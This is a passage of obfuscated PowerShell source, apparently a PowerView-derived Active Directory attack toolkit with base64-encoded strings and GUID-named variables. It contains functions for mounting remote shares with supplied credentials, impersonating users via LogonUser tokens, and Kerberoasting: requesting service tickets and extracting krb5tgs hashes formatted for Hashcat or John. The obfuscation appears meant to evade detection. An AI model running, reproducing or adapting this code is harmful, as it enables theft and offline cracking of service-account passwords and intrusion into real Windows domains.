        ${6f675a112d04499c838f32bbba9fa15a} = 
New-Object PSObject
        ${6f675a112d04499c838f32bbba9fa15a} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) 
${a2937286b06c4978969ea53dafc8c4d6}
        
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA=='))) ${d008f3f897ce4d138e37c84316bf37a1}
   
     ${6f675a112d04499c838f32bbba9fa15a}
    }
    catch {
        
Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEUAcg
ByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAGIAaQBuAGQAaQBuAGcAIABmAG8AcgAgAG
8AYgBqAGUAYwB0ACAAKAAnACQASQBkAGUAbgB0AGkAdAB5ACcAKQAgAGMAbwBuAHQAZQ
B4AHQAIAA6ACAAJABfAA==')))
    }
}
function Add-RemoteConnection {
    
[CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
  
      [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 
'ComputerName', ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName,
        [Parameter(Position = 0, 
ParameterSetName = 'Path', Mandatory = $True)]
        
[ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
      
  [Parameter(Mandatory = $True)]
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential
    
)
    BEGIN {
        ${b276b2addff04ac99b9562757293b7ee} = 
[Activator]::CreateInstance(${e91984bc5d314d8c973be942a7b53561})
     
   ${b276b2addff04ac99b9562757293b7ee}.dwType = 1
    }
    PROCESS {
  
      ${ee19b10dc2534f0cade214f24288d2aa} = @()
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ForEach (${5c3a6e85bd4d471ca3a59cc3cb16dcbc} in 
$ComputerName) {
                ${5c3a6e85bd4d471ca3a59cc3cb16dcbc} 
= ${5c3a6e85bd4d471ca3a59cc3cb16dcbc}.Trim('\')
                
${ee19b10dc2534f0cade214f24288d2aa} += ,
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcACQAewA1AGMAMwBhADYAZQA4ADUAYgBkADQAZAA0ADcAMQBjAGEAMwBhADUAOQ
BjAGMAMwBjAGIAMQA2AGQAYwBiAGMAfQBcAEkAUABDACQA')))
            }
      
  }
        else {
            ${ee19b10dc2534f0cade214f24288d2aa} += 
,$Path
        }
        ForEach (${2b1cd794316846babc6cf4a4a6510811} 
in ${ee19b10dc2534f0cade214f24288d2aa}) {
            
${b276b2addff04ac99b9562757293b7ee}.lpRemoteName = 
${2b1cd794316846babc6cf4a4a6510811}
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBBAGQAZAAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdA
B0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABtAG8AdQBuAHQAOgAgACQAewAyAGIAMQBjAG
QANwA5ADQAMwAxADYAOAA0ADYAYgBhAGIAYwA2AGMAZgA0AGEANABhADYANQAxADAAOA
AxADEAfQA=')))
            ${cb7c2f5226ed472aad598a82813f1629} = 
${da7bc368a7eb43eca4577fdffe587212}::WNetAddConnection2W
(${b276b2addff04ac99b9562757293b7ee}, 
$Credential.GetNetworkCredential().Password, $Credential.UserName, 
4)
            if (${cb7c2f5226ed472aad598a82813f1629} -eq 0) {
       
         Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADIAYgAxAGMAZAA3ADkANAAzADEANgA4ADQANgBiAGEAYgBjADYAYwBmADQAYQ
A0AGEANgA1ADEAMAA4ADEAMQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABtAG
8AdQBuAHQAZQBkAA==')))
            }
            else {
                
Throw "[Add-RemoteConnection] error mounting 
${2b1cd794316846babc6cf4a4a6510811} : 
$(([ComponentModel.Win32Exception]${cb7c2f5226ed472aad598a82813f1629
}).Message)"
            }
        }
    }
}
function Remove-
RemoteConnection {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
  
      [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 
'ComputerName', ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName,
        [Parameter(Position = 0, 
ParameterSetName = 'Path', Mandatory = $True)]
        
[ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
  
  PROCESS {
        ${ee19b10dc2534f0cade214f24288d2aa} = @()
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ForEach (${5c3a6e85bd4d471ca3a59cc3cb16dcbc} in 
$ComputerName) {
                ${5c3a6e85bd4d471ca3a59cc3cb16dcbc} 
= ${5c3a6e85bd4d471ca3a59cc3cb16dcbc}.Trim('\')
                
${ee19b10dc2534f0cade214f24288d2aa} += ,
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcACQAewA1AGMAMwBhADYAZQA4ADUAYgBkADQAZAA0ADcAMQBjAGEAMwBhADUAOQ
BjAGMAMwBjAGIAMQA2AGQAYwBiAGMAfQBcAEkAUABDACQA')))
            }
      
  }
        else {
            ${ee19b10dc2534f0cade214f24288d2aa} += 
,$Path
        }
        ForEach (${2b1cd794316846babc6cf4a4a6510811} 
in ${ee19b10dc2534f0cade214f24288d2aa}) {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBSAGUAbQBvAHYAZQAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQ
AgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAB1AG4AbQBvAHUAbgB0ADoAIAAkAH
sAMgBiADEAYwBkADcAOQA0ADMAMQA2ADgANAA2AGIAYQBiAGMANgBjAGYANABhADQAYQ
A2ADUAMQAwADgAMQAxAH0A')))
            
${cb7c2f5226ed472aad598a82813f1629} = 
${da7bc368a7eb43eca4577fdffe587212}::WNetCancelConnection2
(${2b1cd794316846babc6cf4a4a6510811}, 0, $True)
            if 
(${cb7c2f5226ed472aad598a82813f1629} -eq 0) {
                Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADIAYgAxAGMAZAA3ADkANAAzADEANgA4ADQANgBiAGEAYgBjADYAYwBmADQAYQ
A0AGEANgA1ADEAMAA4ADEAMQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAB1AG
0AbQBvAHUAbgB0AGUAZAA=')))
            }
            else {
            
    Throw "[Remove-RemoteConnection] error unmounting 
${2b1cd794316846babc6cf4a4a6510811} : 
$(([ComponentModel.Win32Exception]${cb7c2f5226ed472aad598a82813f1629
}).Message)"
            }
        }
    }
}
function Invoke-
UserImpersonation {
    [OutputType([IntPtr])]
    [CmdletBinding
(DefaultParameterSetName = 'Credential')]
    Param(
        
[Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
      
  [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential,
    
    [Parameter(Mandatory = $True, ParameterSetName = 
'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        
$TokenHandle,
        [Switch]
        $Quiet
    )
    if 
(([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBUAEEA')))) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UQB1AGkAZQB0AA==')))])) {
        Write-Warning 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8Abg
BdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAH
UAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQ
BkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG
4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbw
ByAGsALgA=')))
    }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        
${84f5c9f6c245491ab8f72d1cfcc5275e} = $TokenHandle
    }
    else {
    
    ${84f5c9f6c245491ab8f72d1cfcc5275e} = [IntPtr]::Zero
        
${e003ba6e181c4a47a4b83856a436053e} = 
$Credential.GetNetworkCredential()
        $UserDomain = 
${e003ba6e181c4a47a4b83856a436053e}.Domain
        
${e0e6b6d01ca04c90bf52fb20f9e41317} = 
${e003ba6e181c4a47a4b83856a436053e}.UserName
        Write-Warning 
"[Invoke-UserImpersonation] Executing LogonUser() with user: 
$($UserDomain)\$(${e0e6b6d01ca04c90bf52fb20f9e41317})"
        
${cb7c2f5226ed472aad598a82813f1629} = 
${d8402eaefa6844d19815430c6481b92a}::LogonUser
(${e0e6b6d01ca04c90bf52fb20f9e41317}, $UserDomain, 
${e003ba6e181c4a47a4b83856a436053e}.Password, 9, 3, 
[ref]${84f5c9f6c245491ab8f72d1cfcc5275e});
${540d2c2f94624a079816177d2dca65b6} = 
[System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
       
 if (-not ${cb7c2f5226ed472aad598a82813f1629}) {
            throw 
"[Invoke-UserImpersonation] LogonUser() Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
        }
    }
    
${cb7c2f5226ed472aad598a82813f1629} = 
${d8402eaefa6844d19815430c6481b92a}::ImpersonateLoggedOnUser
(${84f5c9f6c245491ab8f72d1cfcc5275e})
    if (-not 
${cb7c2f5226ed472aad598a82813f1629}) {
        throw "[Invoke-
UserImpersonation] ImpersonateLoggedOnUser() Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
    }
    Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8Abg
BdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAH
UAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')
))
    ${84f5c9f6c245491ab8f72d1cfcc5275e}
}
function Invoke-
RevertToSelf {
    [CmdletBinding()]
    Param(
        
[ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) 
{
        Write-Warning $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdg
BlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG
4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIA
B0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        
${cb7c2f5226ed472aad598a82813f1629} = 
${69b57a8d9aba46bbb3891217dde2b445}::CloseHandle($TokenHandle)
    }
  
  ${cb7c2f5226ed472aad598a82813f1629} = 
${d8402eaefa6844d19815430c6481b92a}::RevertToSelf();
${540d2c2f94624a079816177d2dca65b6} = 
[System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if 
(-not ${cb7c2f5226ed472aad598a82813f1629}) {
        throw "[Invoke-
RevertToSelf] RevertToSelf() Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
    }
    Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8Aaw
BlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAH
UAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function Get-DomainSPNTicket 
{
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding
(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter
(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, 
ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        
[Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
       
 [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = 
$True, ValueFromPipeline = $True)]
        [ValidateScript({ 
$_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object
[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        
[Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
  
      [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
$Null = [Reflection.Assembly]::LoadWithPartialName
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
      
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgA=')))]) {
            
${d206fb27c46c457685596d5b60010b1a} = $User
        }
        else {
   
         ${d206fb27c46c457685596d5b60010b1a} = $SPN
        }
        
ForEach ($Object in ${d206fb27c46c457685596d5b60010b1a}) {
           
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                
${fa73d8bd18744f3bab791fa356c62c00} = $Object.ServicePrincipalName
   
             $SamAccountName = $Object.SamAccountName
                
${f0e9f07d3fbc46fb90790e4e869492fb} = $Object.DistinguishedName
      
      }
            else {
                
${fa73d8bd18744f3bab791fa356c62c00} = $Object
                
$SamAccountName = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
               
 ${f0e9f07d3fbc46fb90790e4e869492fb} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBOAEsATgBPAFcATgA=')))
            }
            if 
(${fa73d8bd18744f3bab791fa356c62c00} -is 
[System.DirectoryServices.ResultPropertyValueCollection]) {
          
      ${fa73d8bd18744f3bab791fa356c62c00} = 
${fa73d8bd18744f3bab791fa356c62c00}[0]
            }
            try 
{
                ${5abc174b2d354548a098d9e9b622122d} = New-Object 
System.IdentityModel.Tokens.KerberosRequestorSecurityToken -
ArgumentList ${fa73d8bd18744f3bab791fa356c62c00}
            }
        
    catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0AF0AIABFAHIAcg
BvAHIAIAByAGUAcQB1AGUAcwB0AGkAbgBnACAAdABpAGMAawBlAHQAIABmAG8AcgAgAF
MAUABOACAAJwAkAHsAZgBhADcAMwBkADgAYgBkADEAOAA3ADQANABmADMAYgBhAGIANw
A5ADEAZgBhADMANQA2AGMANgAyAGMAMAAwAH0AJwAgAGYAcgBvAG0AIAB1AHMAZQByAC
AAJwAkAHsAZgAwAGUAOQBmADAANwBkADMAZgBiAGMANAA2AGYAYgA5ADAANwA5ADAAZQ
A0AGUAOAA2ADkANAA5ADIAZgBiAH0AJwAgADoAIAAkAF8A')))
            }
      
      if (${5abc174b2d354548a098d9e9b622122d}) {
                
${8b8514f7644b4017acffa012ae664478} = 
${5abc174b2d354548a098d9e9b622122d}.GetRequest()
            }
        
    if (${8b8514f7644b4017acffa012ae664478}) {
                
${6f675a112d04499c838f32bbba9fa15a} = New-Object PSObject
            
    ${1c96507f1c664ff78260dd9e5f29cd8c} = 
[System.BitConverter]::ToString(${8b8514f7644b4017acffa012ae664478}) 
-replace '-'
                ${6f675a112d04499c838f32bbba9fa15a} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
       
         ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) 
${f0e9f07d3fbc46fb90790e4e869492fb}
                
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) 
${5abc174b2d354548a098d9e9b622122d}.ServicePrincipalName
             
   if(${1c96507f1c664ff78260dd9e5f29cd8c} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKA
A/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC
4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALg
AuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA
+AC4AKwApAA==')))) {
                    
${08c53e9e064c4067a0a02ca8d3d8c9d6} = [Convert]::ToByte( 
$Matches.EtypeLen, 16 )
                    
${e35facc67bc744eaa74477beea912c3e} = [Convert]::ToUInt32
($Matches.CipherTextLen, 16)-4
                    
${b2c66a756b2a450085b6fd7a0f9ce13c} = $Matches.DataToEnd.Substring
(0,${e35facc67bc744eaa74477beea912c3e}*2)
                    if
($Matches.DataToEnd.Substring(${e35facc67bc744eaa74477beea912c3e}*2, 
4) -ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                    
    Write-Warning "Error parsing ciphertext for the SPN  
$(${5abc174b2d354548a098d9e9b622122d}.ServicePrincipalName). Use the 
TicketByteHexStream field and extract the hash offline with Get-
KerberoastHashFromAPReq"
                        
${2cc5dbdd85ac48ba990296034bdaaf6b} = $null
                        
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) 
([Bitconverter]::ToString
(${8b8514f7644b4017acffa012ae664478}).Replace('-',''))
               
     } else {
                        
${2cc5dbdd85ac48ba990296034bdaaf6b} = 
"$(${b2c66a756b2a450085b6fd7a0f9ce13c}.Substring(0,32))`$
$(${b2c66a756b2a450085b6fd7a0f9ce13c}.Substring(32))"
                
        ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
     
               }
                } else {
                    Write-
Warning "Unable to parse ticket structure for the SPN  
$(${5abc174b2d354548a098d9e9b622122d}.ServicePrincipalName). Use the 
TicketByteHexStream field and extract the hash offline with Get-
KerberoastHashFromAPReq"
                    
${2cc5dbdd85ac48ba990296034bdaaf6b} = $null
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) 
([Bitconverter]::ToString
(${8b8514f7644b4017acffa012ae664478}).Replace('-',''))
               
 }
                if(${2cc5dbdd85ac48ba990296034bdaaf6b}) {
          
          if ($OutputFormat -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SgBvAGgAbgA=')))) {
                        
${7e51059ebb494feea2b282fbfe48da2c} = "`$krb5tgs`$
$(${5abc174b2d354548a098d9e9b622122d}.ServicePrincipalName):
${2cc5dbdd85ac48ba990296034bdaaf6b}"
                    }
            
        else {
                        if 
(${f0e9f07d3fbc46fb90790e4e869492fb} -ne 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain 
= ${f0e9f07d3fbc46fb90790e4e869492fb}.SubString
(${f0e9f07d3fbc46fb90790e4e869492fb}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 }
                        else {
                     
       $UserDomain = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
               
         }
                        
${7e51059ebb494feea2b282fbfe48da2c} = "`$krb5tgs`$
$(${08c53e9e064c4067a0a02ca8d3d8c9d6})`$*$SamAccountName`$
$UserDomain`$
$(${5abc174b2d354548a098d9e9b622122d}.ServicePrincipalName)*`$
${2cc5dbdd85ac48ba990296034bdaaf6b}"
                    }
            
        ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SABhAHMAaAA='))) 
${7e51059ebb494feea2b282fbfe48da2c}
                }
                
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
          
      ${6f675a112d04499c838f32bbba9fa15a}
            }
        }
    
}
    END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
         
   Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Invoke-
Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
  
      [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
    
    [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
    
    [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        
[String]
        $OutputFormat = 'Hashcat',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${79ab263811814b73a0d9eb6e9491daf2} = @{
            'SPN' = $True
    
        'Properties' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcw
BoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAG
EAbQBlAA==')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainUser 
@79ab263811814b73a0d9eb6e9491daf2 | Where-Object {$_.samaccountname 
-ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | Get-
